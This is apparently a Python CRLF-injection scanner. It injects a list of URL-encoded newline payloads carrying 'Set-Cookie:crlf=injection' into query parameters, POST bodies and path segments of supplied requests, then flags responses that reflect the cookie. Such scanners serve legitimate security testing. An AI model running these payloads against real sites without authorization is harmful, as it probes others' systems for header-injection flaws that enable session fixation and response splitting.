import json
import logging
import asyncio
import httpx
import re
from urllib.parse import urlparse, urljoin, parse_qs
from tabulate import tabulate
from colorama import init, Fore
import signal
import sys

# Initialize colorama
init(autoreset=True)

# Configuration
CRLF_PAYLOADS = [
    '%%0a0aSet-Cookie:crlf=injection',
    '%0aSet-Cookie:crlf=injection',
    '%0d%0aSet-Cookie:crlf=injection',
    '%0dSet-Cookie:crlf=injection',
    '%23%0aSet-Cookie:crlf=injection',
    '%23%0d%0aSet-Cookie:crlf=injection',
    '%23%0dSet-Cookie:crlf=injection',
    '%25%30%61Set-Cookie:crlf=injection',
    '%25%30aSet-Cookie:crlf=injection',
    '%250aSet-Cookie:crlf=injection',
    '%25250aSet-Cookie:crlf=injection',
    '%2e%2e%2f%0d%0aSet-Cookie:crlf=injection',
    '%2f%2e%2e%0d%0aSet-Cookie:crlf=injection',
    '%2F..%0d%0aSet-Cookie:crlf=injection',
    '%3f%0d%0aSet-Cookie:crlf=injection',
    '%3f%0dSet-Cookie:crlf=injection',
    '%u000aSet-Cookie:crlf=injection'
]
DEFAULT_TIMEOUT = 10
SEMAPHORE_LIMIT = 5

last_results = []


def clean_headers(headers):
    """Remove Content-Length and Transfer-Encoding headers (case-insensitive)."""
    if not headers:
        return {}
    return {k: v for k, v in headers.items()
            if k.lower() not in ("content-length", "transfer-encoding")}


async def inject_CRLF_payload(session, request, semaphore):
    results = []
    url = request["url"]
    method = request.get("method", "GET").upper()
    headers_in = request.get("headers", {}) or {}
    body = request.get("body")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    async with semaphore:
        # 1. GET parameter injection
        if method == "GET" and query_params:
            for param, values in query_params.items():
                for payload in CRLF_PAYLOADS:
                    modified_params = query_params.copy()
                    modified_params[param] = [payload for _ in values]
                    new_query_string = "&".join(
                        f"{p}={v}" for p, vals in modified_params.items() for v in vals
                    )
                    new_url = parsed_url._replace(query=new_query_string).geturl()

                    result = await test_CRLF(session, new_url, method, headers=headers_in.copy())
                    if result and result["CRLF_detected"]:
                        result["query_params"] = query_params
                        result["modified_query_params"] = modified_params
                        result["payload"] = payload
                        results.append(result)
                        break

        # 2. POST body injection
        elif method == "POST" and body is not None:
            for payload in CRLF_PAYLOADS:
                data_to_send = None
                json_to_send = None
                if isinstance(body, str):
                    data_to_send = body + payload
                elif isinstance(body, dict):
                    json_to_send = {k: (payload if not isinstance(v, str) else v + payload)
                                    for k, v in body.items()}
                else:
                    data_to_send = str(body) + payload

                try:
                    result = await test_CRLF(session, url, method, headers=headers_in.copy(),
                                             data=data_to_send, json_data=json_to_send)
                    if result and result["CRLF_detected"]:
                        result["post_data"] = body
                        result["modified_post_data"] = json_to_send if json_to_send else data_to_send
                        result["payload"] = payload
                        results.append(result)
                        break
                except Exception as e:
                    logging.error(f"Error while testing CRLF payload: {e}")
                    continue

        # 3. Path-based injection
        if method in ("GET", "POST"):
            path_parts = parsed_url.path.strip("/").split("/") if parsed_url.path.strip("/") else []
            for i, part in enumerate(path_parts):
                if part:
                    for payload in CRLF_PAYLOADS:
                        modified_parts = path_parts.copy()
                        modified_parts[i] = payload
                        modified_path = "/" + "/".join(modified_parts)
                        new_url = parsed_url._replace(path=modified_path).geturl()

                        try:
                            result = await test_CRLF(session, new_url, method, headers=headers_in.copy())
                            if result and result["CRLF_detected"]:
                                result["path"] = parsed_url.path
                                result["modified_path"] = modified_path
                                result["payload"] = payload
                                results.append(result)
                                break
                        except Exception as e:
                            logging.error(f"Error while testing path-based CRLF payload: {e}")
    return results


async def test_CRLF(session, url, method, headers=None, data=None, json_data=None):
    """Send request with cleaned headers and detect CRLF injection via Set-Cookie reflection."""
    try:
        cleaned_headers = clean_headers(headers or {})

        if logging.getLogger().isEnabledFor(logging.DEBUG):
            logging.debug(f"Request: {method} {url}")
            logging.debug(f"Headers before clean: {list(headers.keys()) if headers else []}")
            logging.debug(f"Headers after clean: {list(cleaned_headers.keys())}")

        response = await session.request(method, url, headers=cleaned_headers,
                                         data=data, json=json_data, timeout=DEFAULT_TIMEOUT)

        if "Set-Cookie" in response.headers:
            set_cookie_header = response.headers["Set-Cookie"]
            set_cookie_pattern = r'(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlf=injection)(?:\s*?)(?:$|;)'
            if re.search(set_cookie_pattern, set_cookie_header):
                return {
                    "url": url,
                    "method": method,
                    "status_code": response.status_code,
                    "CRLF_detected": True,
                    "payload": set_cookie_header,
                    "detected_in": "header"
                }

        return {"url": url, "method": method,
                "status_code": response.status_code, "CRLF_detected": False}

    except httpx.RequestError as e:
        logging.error(f"Error testing {url}: {e}")
        return {"url": url, "method": method,
                "status_code": "Error", "CRLF_detected": False, "error": str(e)}
    except Exception as e:
        logging.error(f"Unexpected error testing {url}: {e}")
        return {"url": url, "method": method,
                "status_code": "Error", "CRLF_detected": False, "error": str(e)}


async def process_requests(requests):
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)
    async with httpx.AsyncClient() as session:
        tasks = [inject_CRLF_payload(session, request, semaphore) for request in requests]
        results = await asyncio.gather(*tasks)
        return [item for sublist in results for item in sublist]


def load_requests(file_path):
    with open(file_path, 'r') as f:
        return json.load(f)


def save_results(results, output_file):
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)


def save_output_on_exit(sig, frame):
    global last_results
    logging.info("Interrupted — saving last results to output_on_interrupt.json ...")
    try:
        with open("output_on_interrupt.json", "w") as f:
            json.dump(last_results, f, indent=4)
        logging.info("Saved output_on_interrupt.json")
    except Exception as e:
        logging.error(f"Failed to save output: {e}")
    sys.exit(0)


def print_results(results):
    crlf_results = [r for r in results if r["CRLF_detected"]]
    if not crlf_results:
        print(Fore.YELLOW + "No CRLF vulnerabilities detected.")
        return
    table_data = [[r["url"], r["method"], r["status_code"], Fore.RED + "CRLF Detected"]
                  for r in crlf_results]
    headers = ["URL", "Method", "Status Code", "CRLF Detection"]
    print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))


async def main(input_file, output_file):
    global last_results
    requests = load_requests(input_file)
    logging.info(f"Loaded {len(requests)} requests for testing.")
    results = await process_requests(requests)
    last_results = [r for r in results if r["CRLF_detected"]]
    print_results(last_results)
    save_results(last_results, output_file)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="CRLF Detection Tool")
    parser.add_argument("--input", default="requests.json", help="Input file with requests")
    parser.add_argument("--output", default="results_CRLF.json", help="Output file for results")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    signal.signal(signal.SIGINT, save_output_on_exit)

    logging.basicConfig(level=logging.DEBUG if args.verbose else logging.INFO,
                        format="%(asctime)s [%(levelname)s] %(message)s")

    try:
        asyncio.run(main(args.input, args.output))
    except KeyboardInterrupt:
        print("\nExecution interrupted by user.")

